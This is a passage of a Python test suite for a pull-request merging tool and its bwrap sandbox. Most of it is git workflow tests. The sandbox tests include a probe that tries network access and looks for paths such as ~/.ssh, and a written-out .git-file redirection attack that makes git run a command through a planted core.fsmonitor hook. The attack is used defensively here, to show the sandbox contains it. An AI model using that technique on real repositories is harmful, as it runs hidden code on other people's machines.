        self.assertIn(f'#7 is checked out at {wt}: land or drop it first', r.stderr, r.stderr)
        self.assertEqual((self.calls(), json.loads(self.state_file().read_text())), ([], st), 'files called gh or rewrote the record')
        refuse = 'the gates have not passed on this head over the current master'
        for extra in ({}, {'passed': False, 'tested': head, 'master': master}, {'passed': True, 'tested': self.head, 'master': master},
                      {'passed': True, 'tested': head, 'master': self.fork}):
            self.state_file().write_text(json.dumps(st | extra))
            r = self.mp('land', 7, full_path=True)
            self.assertNotEqual(r.returncode, 0, extra)
            self.assertIn(refuse, r.stderr, f'{extra} {r.stderr}')
            self.assertEqual(git(self.main, 'rev-parse', 'master'), master, extra)
            self.assertTrue(wt.is_dir(), extra)
        self.assertEqual(self.calls(), [], 'land asked gh before its own checks passed')
        passed = st | {'passed': True, 'tested': head, 'master': master}
        view = ['pr', 'view', '7', '--repo', REPO, '--json', 'state,headRefOid']
        other = 'e' * 40
        for kw, shown in (({'state': 'CLOSED'}, f'#7 changed since files (closed, head {self.head[:12]}, gated {self.head[:12]}): drop it and start again'),
                          ({'state': 'MERGED'}, f'#7 changed since files (merged, head {self.head[:12]}, gated {self.head[:12]})'),
                          ({'headRefOid': other}, f'#7 changed since files (open, head {other[:12]}, gated {self.head[:12]}): drop it and start again'),
                          ({'state': 'CLOSED', 'headRefOid': other}, f'#7 changed since files (closed, head {other[:12]}'),
                          (None, 'gh pr view 7: HTTP 502')):
            self.state_file().write_text(json.dumps(passed))
            if kw is None:
                (self.fake / 'view.fail').write_text('HTTP 502\n')
            else:
                self.view(headRefName=self.branch_name, **kw)
            r = self.mp('land', 7, full_path=True)
            info = self.info(case=kw, stdout=r.stdout, stderr=r.stderr)
            self.assertNotEqual(r.returncode, 0, info)
            self.assertIn(shown, r.stderr, info)
            self.assertEqual(self.calls(), [view], info)
            self.assertEqual((git(self.main, 'rev-parse', 'master'), wt.is_dir(), json.loads(self.state_file().read_text())), (master, True, passed), info)
        (self.fake / 'view.fail').unlink()
        self.view(headRefName=self.branch_name)
        self.state_file().write_text(json.dumps(passed))
        (self.main / '.claude/merge-pr/7').mkdir()
        (self.main / '.claude/merge-pr/7/consistency.log').write_text('log\n')
        r = self.mp('land', 7, full_path=True)
        info = self.info(stdout=r.stdout, stderr=r.stderr)
        self.assertEqual(r.returncode, 0, info)
        self.assertEqual(git(self.main, 'rev-parse', 'master'), head, info)
        self.assertEqual(git(self.main, 'branch', '--show-current'), 'master', info)
        self.assertFalse(wt.exists(), info)
        self.assertEqual(git(self.main, 'branch', '--list', self.branch_name), '', info)
        self.assertEqual(git(self.main, 'for-each-ref', 'refs/merge-pr'), '', info)
        self.assertFalse(self.state_file().exists(), info)
        self.assertFalse((self.main / '.claude/merge-pr/7').exists(), info)
        lines = r.stdout.splitlines()
        i = lines.index(f'Landed #7 on master at {head[:12]}. For the user to run:')
        self.assertEqual(lines[i + 1:], ['  git push origin master',
                                         f'  gh pr close 7 --repo {REPO} --comment "Landed on master as {head[:12]} (rebased onto master)."'], info)
        self.assertEqual(self.remote_refs(), before, 'land pushed')
        self.assertEqual(self.calls(), [view], 'land asks gh exactly once, for state and head')

    def test_checkout_exit_status(self):
        """A checkout whose sync succeeded exits 0 (worktree.py --sync reports NOT DONE for a branch ahead of master)."""
        self.fixture()
        self.assertEqual(self.mp('files', 7).returncode, 0)
        r = self.mp('checkout', 7, full_path=True)
        self.assertIn('sync     rebase done', r.stdout)
        self.assertEqual(r.returncode, 0, self.info(stdout=r.stdout, stderr=r.stderr))
        self.assertEqual(r.stdout.splitlines()[-1], f'{self.main / ".claude/worktrees/PR7"} is based on master; next: gates')

    def test_checkout_failures(self):
        """checkout exits 1 and shows worktree.py's output when it wrote to stderr, left another branch checked out, or left
        the worktree not based on master (the last two through a stub worktree.py in the main checkout)."""
        rebase_detach = ("import subprocess, sys\nsubprocess.run(['git', '-C', sys.argv[1], 'rebase', '-q', 'master'])\n"
                         "subprocess.run(['git', '-C', sys.argv[1], 'checkout', '-q', '--detach'])\nprint('sync     stub detached')\n")
        nothing = "print('sync     stub did nothing')\n"
        for case, master_files, stub, shown in (
                ('validator', {'master.txt': 'm\n', 'validator-errors.txt': 'E1\n'}, None, 'rebase done, but the validator reports new errors'),
                ('detached', None, rebase_detach, 'sync     stub detached'), ('unbased', None, nothing, 'sync     stub did nothing')):
            with self.subTest(case=case):
                if hasattr(self, 'main'):
                    shutil.rmtree(self.tmp / 'main')
                    shutil.rmtree(self.tmp / 'remote')
                self.fixture(master_files=master_files)
                self.assertEqual(self.mp('files', 7).returncode, 0)
                if stub:
                    write(self.main, PLAN_REL + '/worktree.py', stub)
                r = self.mp('checkout', 7, full_path=True)
                info = self.info(case=case, stdout=r.stdout, stderr=r.stderr)
                self.assertEqual(r.returncode, 1, info)
                self.assertIn(shown, r.stdout, info)
                self.assertNotIn('next: gates', r.stdout, info)

    def test_checkout_refusals(self):
        self.fixture()
        r = self.mp('checkout', 8, full_path=True)
        self.assertIn('no record of #8: run `merge_pr.py files 8` first', r.stderr)
        self.assertEqual(self.mp('files', 7).returncode, 0)
        (self.main / '.claude/worktrees/PR7').mkdir(parents=True)
        r = self.mp('checkout', 7, full_path=True)
        self.assertNotEqual(r.returncode, 0)
        self.assertIn('PR7 exists; `merge_pr.py drop 7` removes it', r.stderr, r.stderr)
        self.assertEqual(git(self.main, 'branch', '--list', 'P250-SUP19-bob'), '')

    def test_drop(self):
        self.fixture()
        self.assertEqual(self.mp('files', 7).returncode, 0)
        self.mp('checkout', 7, full_path=True)
        wt = self.main / '.claude/worktrees/PR7'
        self.assertTrue(wt.is_dir())
        write(wt, 'scratch.txt', 'uncommitted\n')
        (self.main / '.claude/merge-pr/7').mkdir()
        master = git(self.main, 'rev-parse', 'master')
        r = self.mp('drop', 7, full_path=True)
        info = self.info(stdout=r.stdout, stderr=r.stderr)
        self.assertEqual(r.returncode, 0, info)
        self.assertIn('dropped #7: worktree, branch P250-SUP19-bob and fetched head removed', r.stdout, info)
        self.assertFalse(wt.exists(), info)
        self.assertEqual(git(self.main, 'branch', '--list', 'P250-SUP19-bob'), '', info)
        self.assertEqual(git(self.main, 'for-each-ref', 'refs/merge-pr'), '', info)
        self.assertFalse(self.state_file().exists(), info)
        self.assertFalse((self.main / '.claude/merge-pr/7').exists(), info)
        self.assertEqual(git(self.main, 'rev-parse', 'master'), master, info)
        self.assertIn('no record of #7', self.mp('drop', 7).stderr)

    def test_drop_keeps_branch(self):
        """A local branch that existed before checkout survives checkout's failure and drop (no `created`)."""
        self.fixture()
        git(self.main, 'branch', 'P250-SUP19-bob', self.fork)
        self.assertEqual(self.mp('files', 7).returncode, 0)
        r = self.mp('checkout', 7, full_path=True)
        info = self.info(stdout=r.stdout, stderr=r.stderr)
        self.assertNotEqual(r.returncode, 0, info)
        self.assertNotIn('created', json.loads(self.state_file().read_text()), info)
        self.assertFalse((self.main / '.claude/worktrees/PR7').exists(), info)
        r = self.mp('drop', 7, full_path=True)
        info = self.info(stdout=r.stdout, stderr=r.stderr)
        self.assertEqual((r.returncode, r.stdout.strip()), (0, 'dropped #7: worktree, fetched head removed'), info)
        self.assertEqual(git(self.main, 'rev-parse', 'P250-SUP19-bob'), self.fork, info)
        self.assertEqual(git(self.main, 'for-each-ref', 'refs/merge-pr'), '', info)
        self.assertFalse(self.state_file().exists(), info)

    def test_drop_branch_gone(self):
        """A created branch deleted by hand does not make drop fail; files rerun after the worktree is gone keeps `created`,
        so drop still deletes the branch checkout made."""
        self.fixture()
        self.assertEqual(self.mp('files', 7).returncode, 0)
        self.assertEqual(self.mp('checkout', 7, full_path=True).returncode, 0)
        wt = self.main / '.claude/worktrees/PR7'
        git(self.main, 'worktree', 'remove', '--force', str(wt))
        r = self.mp('files', 7)
        info = self.info(stdout=r.stdout, stderr=r.stderr)
        self.assertEqual(r.returncode, 0, info)
        self.assertTrue(json.loads(self.state_file().read_text()).get('created'), info)
        git(self.main, 'branch', '-D', 'P250-SUP19-bob')
        r = self.mp('drop', 7, full_path=True)
        info = self.info(stdout=r.stdout, stderr=r.stderr)
        self.assertEqual(r.returncode, 0, info)
        self.assertEqual((self.state_file().exists(), git(self.main, 'for-each-ref', 'refs/merge-pr')), (False, ''), info)
        self.assertEqual(self.mp('files', 7).returncode, 0)
        self.assertNotIn('created', json.loads(self.state_file().read_text()))

    def test_drop_failure(self):
        """drop checks every step: a locked worktree (whose branch is then still checked out) fails, exits nonzero listing the failed
        steps and keeps the record and the worktree; after unlocking, drop finishes."""
        self.fixture()
        self.assertEqual(self.mp('files', 7).returncode, 0)
        self.assertEqual(self.mp('checkout', 7, full_path=True).returncode, 0)
        wt = self.main / '.claude/worktrees/PR7'
        git(self.main, 'worktree', 'lock', str(wt))
        st = json.loads(self.state_file().read_text())
        r = self.mp('drop', 7, full_path=True)
        info = self.info(stdout=r.stdout, stderr=r.stderr)
        self.assertNotEqual(r.returncode, 0, info)
        lines = r.stderr.strip().splitlines()
        self.assertEqual(lines[0], 'drop #7 incomplete; the record stays:', info)
        self.assertEqual([l.split(':')[0] for l in lines[1:] if l.startswith('  git ')], [f'  git worktree remove --force {wt}', '  git branch -D P250-SUP19-bob'],
                         info)  # git's own messages may continue on further lines
        self.assertEqual((wt.is_dir(), json.loads(self.state_file().read_text()), git(self.main, 'branch', '--list', 'P250-SUP19-bob').strip()),
                         (True, st, '+ P250-SUP19-bob'), info)
        self.assertEqual(r.stdout, '', info)
        git(self.main, 'worktree', 'unlock', str(wt))
        r = self.mp('drop', 7, full_path=True)
        info = self.info(stdout=r.stdout, stderr=r.stderr)
        self.assertEqual((r.returncode, r.stdout.strip()), (0, 'dropped #7: worktree, branch P250-SUP19-bob and fetched head removed'), info)
        self.assertEqual((wt.exists(), self.state_file().exists(), git(self.main, 'branch', '--list', 'P250-SUP19-bob')), (False, False, ''), info)


PROBE = r'''import json, os, socket, subprocess, sys
a = json.loads(sys.argv[1])
def attempt(f):
    try:
        f()
        return 'ok'
    except OSError as e:
        return f'{type(e).__name__}:{e.errno}'
def put(p):
    with open(p, 'w') as f:
        f.write('x')
r = {'tmp_before': sorted(os.listdir('/tmp')), 'pid': os.getpid(), 'cwd': os.getcwd(), 'env': dict(os.environ)}
r['connect'] = attempt(lambda: socket.create_connection(('1.1.1.1', 53), timeout=3).close())
r['dns'] = attempt(lambda: socket.getaddrinfo('example.com', 80))
r['interfaces'] = sorted(n for _, n in socket.if_nameindex())
r['outside_write'] = attempt(lambda: put(a['outside']))
r['common_write'] = attempt(lambda: put(os.path.join(a['common'], 'merge-probe')))
r['common_read'] = attempt(lambda: open(os.path.join(a['common'], 'HEAD')).read())
r['hidden'] = {p: os.path.lexists(p) for p in a['hidden']}
r['kept'] = {p: os.path.isdir(p) for p in a['kept']}
r['home'] = sorted(os.listdir(a['home'])) if os.path.isdir(a['home']) else None
r['run_user'] = os.path.exists('/run/user')
try:
    r['systemd_run'] = subprocess.run(['systemd-run', '--user', '--scope', '--quiet', 'true'], capture_output=True, timeout=20).returncode
except OSError as e:
    r['systemd_run'] = 'OSError'
r['wt_write'] = attempt(lambda: put(os.path.join(os.getcwd(), a['marker'])))
r['wt_read'] = open(a['marker']).read() if os.path.exists(a['marker']) else None
r['tmp_write'] = attempt(lambda: put('/tmp/' + a['marker']))
r['git'] = subprocess.run(['git', 'rev-parse', 'HEAD'], capture_output=True, text=True).stdout.strip()
cg = open('/proc/self/cgroup').read().split('::', 1)[1].strip()
r['memory_max'] = open('/sys/fs/cgroup' + cg + '/memory.max').read().strip()
r['pids_max'] = open('/sys/fs/cgroup' + cg + '/pids.max').read().strip()
print('PROBE ' + json.dumps(r))
'''


class Sandbox(Base):
    """sandbox and sandboxed in-process on a synthetic worktree under /var/tmp (see the module docstring)."""
    BASE, SANDBOX = '/var/tmp', True

    def setUp(self):
        super().setUp()
        self.repo = self.tmp / 'repo'
        self.repo.mkdir()
        git(self.repo, 'init', '-q', '-b', 'master')
        write(self.repo, 'a.txt', 'a\n')
        git(self.repo, 'add', '-A')
        git(self.repo, '-c', 'user.name=a', '-c', 'user.email=a@x', 'commit', '-q', '-m', 'init')
        self.wt = add_worktree(self.repo, 'PR7', 'pr-7')

    def sandboxed(self, cmd, mb=256, **kw):
        log = self.tmp / f'log-{time.monotonic_ns()}.txt'
        with patch.dict(os.environ, {'MERGE_TESTER_SECRET': 'leak', 'CXX': 'leak'}):
            code = MP.sandboxed(cmd, self.wt, mb, log, **kw)
        return code, log.read_text()

    def test_sandbox_probe(self):
        home = str(Path.home())
        keep = [d for d in os.environ.get('PATH', '').split(':') if d.startswith(home + '/') and Path(d).is_dir()]
        hidden = [p for p in (f'{home}/.config', f'{home}/.ssh', f'{home}/.gitconfig', f'{home}/.cache', f'{home}/.claude', str(ROOT))
                  if os.path.lexists(p) and not any(k == p or k.startswith(p + '/') for k in keep)]
        marker = f'merge-probe-{os.getpid()}-{time.monotonic_ns()}'
        common = git(self.wt, 'rev-parse', '--path-format=absolute', '--git-common-dir')
        outside = self.tmp / 'outside.txt'
        args = {'outside': str(outside), 'common': common, 'hidden': hidden, 'kept': keep, 'home': home, 'marker': marker}
        expected_env = {k: os.environ[k] for k in WHITELIST if k in os.environ and k not in UNSET} | {'TMPDIR': '/tmp', 'CCACHE_DISABLE': '1', 'CP_MEMORY_CAPPED': '256'}
        code, log = self.sandboxed([sys.executable, '-c', PROBE, json.dumps(args)])
        info = self.info(log=log)
        self.assertEqual(code, 0, info)
        r = json.loads(next(l for l in log.splitlines() if l.startswith('PROBE '))[6:])
        self.assertNotEqual(r['connect'], 'ok', info)
        self.assertNotEqual(r['dns'], 'ok', info)
        self.assertEqual(r['interfaces'], ['lo'], info)
        self.assertEqual(r['outside_write'], f'OSError:{errno.EROFS}', info)
        self.assertFalse(outside.exists())
        self.assertEqual(r['common_write'], f'OSError:{errno.EROFS}', info)
        self.assertEqual(r['common_read'], 'ok', info)
        self.assertEqual(r['git'], git(self.wt, 'rev-parse', 'HEAD'), info)
        self.assertEqual(r['hidden'], {p: False for p in hidden}, info)
        self.assertEqual(r['kept'], {p: True for p in keep}, info)
        self.assertEqual(set(r['home'] or []), {Path(k).relative_to(home).parts[0] for k in keep}, info)
        self.assertFalse(r['run_user'], info)
        self.assertNotEqual(r['systemd_run'], 0, info)
        self.assertEqual((r['wt_write'], r['wt_read']), ('ok', 'x'), info)
        self.assertFalse((self.wt / marker).exists(), f'{info} a write in the worktree reached the host')
        self.assertEqual((r['tmp_write'], r['tmp_before']), ('ok', []), info)
        self.assertFalse(Path('/tmp', marker).exists(), info)
        self.assertEqual(glob.glob(f'/var/tmp/merge-pr-*/{marker}'), [], info)
        self.assertEqual(r['cwd'], str(self.wt), info)
        self.assertLessEqual(r['pid'], 4, f'{info} no PID namespace')
        # systemd-run adds its scope's INVOCATION_ID and bwrap --chdir sets PWD; nothing else beyond the whitelist
        self.assertEqual({k: v for k, v in r['env'].items() if k not in ('INVOCATION_ID', 'PWD')}, expected_env, info)
        self.assertEqual(r['env'].get('PWD'), str(self.wt), info)
        self.assertNotEqual(r['env'].get('INVOCATION_ID'), os.environ.get('INVOCATION_ID'), info)
        self.assertEqual((r['memory_max'], r['pids_max']), (str(256 << 20), '4096'), info)

    def host_state(self, wt):
        """What host git sees of wt: its git directory, status with ignored and untracked files, and the .git file."""
        return (git(wt, 'rev-parse', '--absolute-git-dir'), git(wt, 'status', '--porcelain', '--ignored', '--untracked-files=all'),
                (wt / '.git').read_text())

    def test_sandbox_gitfile(self):
        """Rewriting, appending to, chmodding, renaming, replacing and deleting the worktree's .git file inside works on the overlay
        only, so host git keeps the real git directory; the reviewer's attack (point .git at a gitdir whose core.fsmonitor runs a
        command) works on an unsandboxed control worktree, and inside it never reaches the host, whose git status stays as it was."""
        before = self.host_state(self.wt)
        probe = ("import json, os\nr = {}\ndef t(k, f):\n    try:\n        f(); r[k] = 'ok'\n    except OSError as e:\n        r[k] = e.errno\n"
                 "def put(p, m, x='gitdir: /nowhere\\n'):\n    with open(p, m) as f: f.write(x)\n"
                 "t('write', lambda: put('.git', 'w'))\nt('append', lambda: put('.git', 'a', 'more\\n'))\nt('chmod', lambda: os.chmod('.git', 0o777))\n"
                 "t('rename', lambda: os.rename('.git', 'moved'))\nput('new', 'w')\nt('replace', lambda: os.replace('new', '.git'))\n"
                 "t('unlink', lambda: os.unlink('.git'))\nt('mkdir', lambda: os.mkdir('.git'))\nr['inside'] = sorted(os.listdir('.'))\n"
                 "print('GITFILE ' + json.dumps(r))\n")
        code, log = self.sandboxed([sys.executable, '-c', probe])
        info = self.info(log=log)
        self.assertEqual(code, 0, info)
        r = json.loads(next(l for l in log.splitlines() if l.startswith('GITFILE '))[8:])
        self.assertEqual(r, {k: 'ok' for k in ('write', 'append', 'chmod', 'rename', 'replace', 'unlink', 'mkdir')} | {'inside': ['.git', 'a.txt', 'moved']},
                         info)
        self.assertEqual(self.host_state(self.wt), before, info)
        self.assertEqual(oct((self.wt / '.git').stat().st_mode & 0o777), oct(0o644 & ~self.umask()), info)
        self.assertFalse((self.wt / 'moved').exists(), info)
        gitdir = before[0]

        def attack(wt, marker):
            g = 'git'
            return f'''cd "{wt}"
mkdir -p .evil/objects/info .evil/refs/heads
echo "{self.repo}/.{g}/objects" > .evil/objects/info/alternates
{g} rev-parse HEAD > .evil/refs/heads/pr
echo "ref: refs/heads/pr" > .evil/HEAD
cp "{gitdir}/index" .evil/index 2>/dev/null
printf '#!/bin/sh\\ntouch "{marker}"\\n' > .evil/hook; chmod +x .evil/hook
printf '[core]\\n\\trepositoryformatversion = 0\\n\\tbare = false\\n\\tfsmonitor = {wt}/.evil/hook\\n' > .evil/config
printf '{g}dir: .evil\\n' > .{g}
'''
        control, cmarker = add_worktree(self.repo, 'CTRL', 'ctrl'), self.tmp / 'PWNED-control'
        REAL_RUN(['sh', '-c', attack(control, cmarker)], env=ISOLATED, capture_output=True)
        REAL_RUN(['git', 'status', '--porcelain'], cwd=control, env=ISOLATED, capture_output=True)
        self.assertTrue(cmarker.exists(), 'the attack control no longer runs its command: update the probe')
        marker = self.tmp / 'PWNED'
        code, log = self.sandboxed(['sh', '-c', attack(self.wt, marker) + 'cat .git; ls -d .evil'])
        info = self.info(log=log)
        self.assertEqual((code, log.split()), (0, ['gitdir:', '.evil', '.evil']), f'{info} the attack did not run inside')
        self.assertFalse(marker.exists(), f'{info} the sandboxed command ran')
        st = REAL_RUN(['git', 'status', '--porcelain'], cwd=self.wt, env=ISOLATED, capture_output=True, text=True)
        self.assertEqual((st.returncode, st.stdout), (0, ''), f'{info} {st.stderr}')
        self.assertFalse(marker.exists(), f'{info} host git status ran the attacker command')
        self.assertFalse((self.wt / '.evil').exists(), info)
        self.assertEqual(self.host_state(self.wt), before, info)

    @staticmethod
    def umask():
        m = os.umask(0)
        os.umask(m)
        return m

    def test_sandbox_overlay(self):
        """Appends, edits, deletions, chmods, 0111 directories, a planted __pycache__ .pyc of a host-run module and a nested
        repository made inside never reach the real worktree; the private /tmp and the /var/tmp/merge-pr-* scratch directory
        (overlay work directory and 0111 directories included) are gone after the run."""
        write(self.wt, 'b.txt', 'b\n')
        write(self.wt, 'c.sh', 'c\n')
        write(self.wt, 'd/e.txt', 'e\n')
        git(self.wt, 'add', '-A')
        git(self.wt, '-c', 'user.name=a', '-c', 'user.email=a@x', 'commit', '-q', '-m', 'more')
        before = self.host_state(self.wt)
        files = {p: ((self.wt / p).read_bytes(), (self.wt / p).stat().st_mode) for p in ('a.txt', 'b.txt', 'c.sh', 'd/e.txt')}
        pyc = f'96-Local Testing/__pycache__/03-consistency.{sys.implementation.cache_tag}.pyc'
        script = (f'set -e; echo more >> a.txt; echo new > b.txt; chmod 0755 c.sh; rm -r d; mkdir -p "$(dirname "{pyc}")"; echo x > "{pyc}"; '
                  'git init -q nested; mkdir -p locked/sub /tmp/q/r; touch locked/sub/f; chmod 0111 locked/sub locked /tmp/q/r /tmp/q; '
                  'cat a.txt b.txt; test ! -e d && test -x c.sh && test -e nested/.git && echo INSIDE-OK')
        made = []
        real = tempfile.mkdtemp
        with patch.object(MP.tempfile, 'mkdtemp', lambda *a, **k: made.append(real(*a, **k)) or made[-1]):
            code, log = self.sandboxed(['sh', '-c', script])
        info = self.info(log=log, scratch=made)
        self.assertEqual((code, log.split()), (0, ['a', 'more', 'new', 'INSIDE-OK']), info)
        self.assertEqual(self.host_state(self.wt), before, info)
        self.assertEqual({p: ((self.wt / p).read_bytes(), (self.wt / p).stat().st_mode) for p in files}, files, info)
        for p in (pyc, 'nested', 'locked', '96-Local Testing'):
            self.assertFalse((self.wt / p).exists(), f'{info} {p}')
        self.assertEqual(len(made), 1, info)
        self.assertTrue(made[0].startswith('/var/tmp/merge-pr-'), info)
        self.assertFalse(os.path.lexists(made[0]), f'{info} scratch directory left behind')

    def test_sandbox_scratch_symlink(self):
        """A symbolic link to a directory left in the overlay or the private /tmp does not break the scratch removal."""
        made = []
        real = tempfile.mkdtemp
        with patch.object(MP.tempfile, 'mkdtemp', lambda *a, **k: made.append(real(*a, **k)) or made[-1]):
            try:
                code, log = self.sandboxed(['sh', '-c', 'ln -s /etc etc-link; ln -s / /tmp/root-link; mkdir sub; ln -s .. sub/up; exit 4'])
            except BaseException as e:  # report, then clean the scratch directory this test made
                for d in made:
                    REAL_RUN(['chmod', '-R', 'u+rwx', d], capture_output=True)
                    shutil.rmtree(d, ignore_errors=True)
                self.fail(self.info(error=f'sandboxed raised {type(e).__name__}: {e}', scratch=made))
        info = self.info(log=log, scratch=made)
        self.assertEqual(code, 4, info)
        self.assertFalse(os.path.lexists(made[0]), f'{info} scratch directory left behind')
        self.assertFalse(os.path.lexists(self.wt / 'etc-link'), info)

    def test_sandbox_hidden(self):
        """Inside, another worktree's git directory is hidden (common/worktrees lists only the own one), the own git directory
        is readable but not writable, and /mnt, /media and /srv are empty."""
        other = add_worktree(self.repo, 'OTHER', 'other')
        common = Path(git(self.wt, 'rev-parse', '--path-format=absolute', '--git-common-dir'))
        own, theirs = git(self.wt, 'rev-parse', '--absolute-git-dir'), git(other, 'rev-parse', '--absolute-git-dir')
        self.assertEqual((Path(own).parent, Path(theirs).parent), (common / 'worktrees', common / 'worktrees'))
        mounts = [d for d in ('/mnt', '/media', '/srv') if os.path.isdir(d)]
        probe = ("import json, os, sys\na = json.loads(sys.argv[1])\ndef w(p):\n    try:\n        open(p, 'w').close(); return 'ok'\n"
                 "    except OSError as e:\n        return e.errno\n"
                 "print('HIDDEN ' + json.dumps({'listing': sorted(os.listdir(a['wts'])), 'theirs': os.path.lexists(a['theirs']),"
                 " 'own_head': open(os.path.join(a['own'], 'HEAD')).read(), 'own_write': w(os.path.join(a['own'], 'x')),"
                 " 'theirs_wt': os.path.isdir(a['other']), 'mounts': {d: os.listdir(d) for d in a['mounts']}}))\n")
        args = {'wts': str(common / 'worktrees'), 'theirs': theirs, 'own': own, 'other': str(other), 'mounts': mounts}
        code, log = self.sandboxed([sys.executable, '-c', probe, json.dumps(args)])
        info = self.info(log=log)
        self.assertEqual(code, 0, info)
        r = json.loads(next(l for l in log.splitlines() if l.startswith('HIDDEN '))[7:])
        self.assertEqual(r, {'listing': ['PR7'], 'theirs': False, 'own_head': (Path(own) / 'HEAD').read_text(), 'own_write': errno.EROFS,
                             'theirs_wt': True, 'mounts': {d: [] for d in mounts}}, info)
        self.assertTrue(os.path.isdir(theirs) and not (Path(own) / 'x').exists(), info)

    def test_sandbox_memory_kill(self):
        code, log = self.sandboxed([sys.executable, '-c', 'x = b"x" * (256 << 20); print(len(x))'], mb=64)
        self.assertNotEqual(code, 0, self.info(log=log))
        code, log = self.sandboxed([sys.executable, '-c', 'x = b"x" * (8 << 20); print(len(x))'], mb=64)
        self.assertEqual((code, log.strip()), (0, str(8 << 20)), self.info(log=log))

    def test_sandbox_exit_status(self):
        for k in (0, 1, 7, 255):
            self.assertEqual(self.sandboxed(['bash', '-c', f'exit {k}'])[0], k)
        code, log = self.sandboxed(['bash', '-c', 'echo out; echo err >&2'])
        self.assertEqual((code, sorted(log.split())), (0, ['err', 'out']))
        code, log = self.sandboxed(['bash', '-c', 'echo "CXX=$CXX"'], env={'CXX': 'g++-14'})
        self.assertEqual(log.strip(), 'CXX=g++-14')

    def test_sandbox_worktree_under_tmp(self):
        """The private /tmp is bound before the worktree, so a worktree under the host /tmp stays visible and writable (in its overlay)."""
        base = Path(tempfile.mkdtemp(prefix='merge-tester-', dir='/tmp'))
        try:
            git(base, 'init', '-q', '-b', 'master')
            write(base, 'a.txt', 'a\n')
            git(base, 'add', '-A')
            git(base, '-c', 'user.name=a', '-c', 'user.email=a@x', 'commit', '-q', '-m', 'init')
            wt = add_worktree(base, 'PR8', 'pr-8')
            log = base / 'log.txt'
            code = MP.sandboxed(['bash', '-c', 'pwd; cat a.txt; touch made; ls made'], wt, 256, log)
            self.assertEqual((code, log.read_text().split()), (0, [str(wt), 'a', 'made']), log.read_text())
            self.assertFalse((wt / 'made').exists(), 'the overlay write reached the host')
        finally:
            shutil.rmtree(base, ignore_errors=True)

    def test_sandbox_timeout(self):
        tag = f'{os.getpid() % 1000 + 60}.{time.monotonic_ns() % 997}'
        t = time.monotonic()
        with patch.object(MP, 'TIMEOUT', 2):
            code, log = self.sandboxed(['sleep', tag])
        self.assertEqual(code, 124, log)
        self.assertLess(time.monotonic() - t, 30)
        self.assertIn('TIMEOUT after 2 s', log)
        deadline = time.monotonic() + 10
        while time.monotonic() < deadline:
            alive = [p for p in Path('/proc').iterdir() if p.name.isdigit() and self.cmdline(p) == ['sleep', tag]]
            if not alive:
                break
            time.sleep(0.2)
        self.assertEqual(alive, [], 'the timed-out command survived')

    @staticmethod
    def cmdline(p):
        try:
            return (p / 'cmdline').read_bytes().decode().split('\0')[:-1]
        except OSError:
            return None

    def test_sandbox_unavailable(self):
        real = shutil.which
        with patch.object(MP.shutil, 'which', lambda name, *a, **k: None if name == 'bwrap' else real(name, *a, **k)):
            with self.assertRaises(SystemExit) as e:
                MP.sandboxed(['true'], self.wt, 64)
        self.assertIn('the gates need bwrap and memory-capped systemd user scopes', str(e.exception))
        with patch.object(MP.cap, 'available', lambda: False), self.assertRaises(SystemExit):
            MP.sandboxed(['true'], self.wt, 64)


class Gates(Base):
    """gates, run and suites of a copied merge_pr.py on a synthetic main checkout under /var/tmp with the mini plan."""
    BASE, SANDBOX = '/var/tmp', True

    def setUp(self):
        super().setUp()
        self.main = make_repo(self.tmp / 'main')
        self.wt = add_worktree(self.main, 'PR7', 'P001-C01-bob')
        write(self.wt, D_TESTER, gate_stub('d', ''))
        commit(self.wt, 'pr adds a tester')

    def state(self, package='P001'):
        st = {'repo': REPO, 'head': git(self.wt, 'rev-parse', 'HEAD'), 'base': git(self.main, 'rev-parse', 'master'), 'branch': 'P001-C01-bob',
              'package': package, 'model': 'fable' if package else None, 'worktree': str(self.wt)}
        self.state_file().parent.mkdir(parents=True, exist_ok=True)
        self.state_file().write_text(json.dumps(st))
        return st

    def control(self, ctl):
        write(self.wt, 'gate-control.json', json.dumps(ctl) + '\n')
        commit(self.wt, 'control')

    def gates(self):
        r = self.mp('gates', 7, full_path=True, cfg=())
        lines = r.stdout.splitlines()
        result = [(l.split(' ', 1)[0], l.split(' ', 1)[1].rsplit(' (', 1)[0]) for l in lines
                  if l.startswith(('PASS ', 'FAIL ')) and ' s, exit ' in l]
        runs = []
        for log in sorted((self.main / '.claude/merge-pr/7').glob('*.log')):
            runs += [json.loads(l[5:]) for l in log.read_text().splitlines() if l.startswith('GATE ')]
        return r, result, runs

    def env(self, **kw):
        return super().env(**kw) | {'CXX': 'leak'}

    def caps(self):
        e = self.env()
        return int(e.get('CP_TEST_MEMORY_MB', '4096')) << 20, int(e.get('CP_TEST_PREFLIGHT_MB', '2048')) << 20

    def test_gates_all_pass(self):
        st = self.state()
        r, result, runs = self.gates()
        info = self.info(stdout=r.stdout, stderr=r.stderr)
        suites = [X_TESTER, D_TESTER]
        names = ['consistency', 'plan check', 'plan doctor', *(f'{s} {k}' for s in suites for k in ('quick', 'full g++', 'full g++-14')),
                 'integration sanitizers', 'workspace check']
        self.assertEqual(result, [('PASS', n) for n in names], info)
        self.assertEqual(r.returncode, 0, info)
        head, master = git(self.wt, 'rev-parse', 'HEAD'), git(self.main, 'rev-parse', 'master')
        self.assertEqual(r.stdout.splitlines()[-1], f'PASS: gates on {head[:12]} over master {master[:12]}', info)
        self.assertIn('suites: 01-x_tester.py, 01-d_tester.py', r.stdout, info)
        self.assertEqual(json.loads(self.state_file().read_text()), st | {'tested': head, 'master': master, 'passed': True}, info)
        main_cap, pre = self.caps()
        want = [('d', 'full', 'g++', main_cap, ['--mode', 'full', '--seed', '1']), ('d', 'full', 'g++-14', main_cap, ['--mode', 'full', '--seed', '1']),
                ('d', 'quick', 'None', pre, ['--mode', 'quick', '--seed', '1']),
                ('x', 'full', 'g++', 16384 << 20, ['--mode', 'full', '--seed', '1']), ('x', 'full', 'g++-14', 16384 << 20, ['--mode', 'full', '--seed', '1']),
                ('x', 'quick', 'None', pre, ['--mode', 'quick', '--seed', '1']),
                ('integration', '-', 'None', 6144 << 20, ['--sanitizers']), ('workspace', '-', 'None', main_cap, ['--check'])]
        got = sorted((g['name'], g['mode'], g['cxx'], int(g['mem']), g['args']) for g in runs)
        self.assertEqual(got, sorted(want), info)
        self.assertEqual(git(self.wt, 'status', '--porcelain'), '', info)
        self.no_mutation(r, info)

    NONE = 'mutation records: none (no changed header)'

    def no_mutation(self, r, info):
        """The pull request changes no library header: the `none` line once, after the suite gates, before integration."""
        lines = r.stdout.splitlines()
        self.assertEqual(lines.count(self.NONE), 1, info)
        at, suite = lines.index(self.NONE), [k for k, l in enumerate(lines) if '_tester.py' in l]
